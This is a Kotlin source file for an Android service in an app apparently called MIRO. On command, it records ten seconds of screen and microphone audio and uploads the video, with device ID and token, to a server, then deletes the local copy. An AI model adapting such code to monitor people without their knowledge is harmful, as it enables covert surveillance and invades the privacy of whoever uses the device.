package com.nexora.miro.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.nexora.miro.Api
import com.nexora.miro.Prefs
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.*

class ScreenCaptureService : Service() {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var isRecording = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "capture_channel")
            .setContentTitle("MIRO Surveillance Active")
            .setContentText("Prêt pour le partage d'écran")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .build()
        startForeground(3, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_PROJECTION" -> {
                val resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED)
                val data = intent.getParcelableExtra<Intent>("data")
                if (data != null) initMediaProjection(resultCode, data)
            }
            "RECORD_NOW" -> startRecordingSnippet()
        }
        return START_STICKY
    }

    private fun initMediaProjection(resultCode: Int, data: Intent) {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)
    }

    private fun startRecordingSnippet() {
        if (mediaProjection == null || isRecording) {
            if (mediaProjection == null) {
                val intent = Intent(this, com.nexora.miro.MainActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.action = "REQUEST_SCREEN_CAPTURE"
                startActivity(intent)
            }
            return
        }
        
        isRecording = true
        val metrics = DisplayMetrics()
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        wm.defaultDisplay.getMetrics(metrics)
        
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val file = File(cacheDir, "live_screen_${System.currentTimeMillis()}.mp4")
        
        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setOutputFile(file.absolutePath)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setVideoSize(width, height)
            setVideoFrameRate(30)
            setVideoEncodingBitRate(4 * 1024 * 1024)
        }

        try {
            mediaRecorder?.prepare()
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "NexoraLive", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mediaRecorder?.surface, null, null
            )
            mediaRecorder?.start()

            Timer().schedule(object : TimerTask() {
                override fun run() { stopAndUpload(file) }
            }, 10000)

        } catch (e: Exception) {
            e.printStackTrace()
            isRecording = false
        }
    }

    private fun stopAndUpload(file: File) {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            virtualDisplay?.release()
            uploadToServer(file)
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            isRecording = false
        }
    }

    private fun uploadToServer(file: File) {
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("video", file.name, file.asRequestBody("video/mp4".toMediaTypeOrNull()))
            .addFormDataPart("deviceId", Prefs.deviceId ?: "unknown")
            .addFormDataPart("sessionId", UUID.randomUUID().toString())
            .addFormDataPart("durationMs", "10000")
            .build()

        Api.postMultipart("/recordings/upload", requestBody, Prefs.token) { success ->
            if (success) file.delete()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("capture_channel", "Capture Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        mediaProjection?.stop()
    }
}